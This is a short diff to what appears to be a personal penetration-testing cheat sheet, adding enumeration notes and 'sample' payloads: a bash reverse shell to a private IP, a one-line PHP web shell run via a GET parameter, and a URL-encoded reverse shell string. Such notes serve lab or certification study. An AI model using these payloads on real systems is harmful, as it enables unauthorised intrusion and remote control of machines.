@@ -4,6 +4,11 @@ $ uname -a
 $ linpeas
 $ find / -group filter 2>dev/null
 
+* Sample bash reverse shell:
+$ bash -i >& /dev/tcp/192.168.45.204/443 0>&1
+$ <?php system($_GET["cmd"]); ?>'
+$ 0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.45.162/80+0%3E%261%27
+
 * if you founf more domain or ip addresses, add to dns -> /etc/hosts
 
 * Don't forget to:
